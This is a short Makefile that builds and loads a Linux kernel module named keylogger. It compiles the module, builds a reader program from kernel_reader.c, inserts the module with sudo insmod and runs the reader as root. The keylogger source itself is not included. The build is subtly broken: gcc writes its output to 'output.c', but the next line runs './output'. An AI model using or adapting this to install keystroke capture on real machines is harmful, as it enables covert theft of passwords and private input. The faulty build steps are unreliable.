obj-m += keylogger.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) modules
	gcc -o output.c kernel_reader.c
	sudo insmod keylogger.ko
	sudo ./output
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(shell pwd) clean
	sudo rmmod keylogger
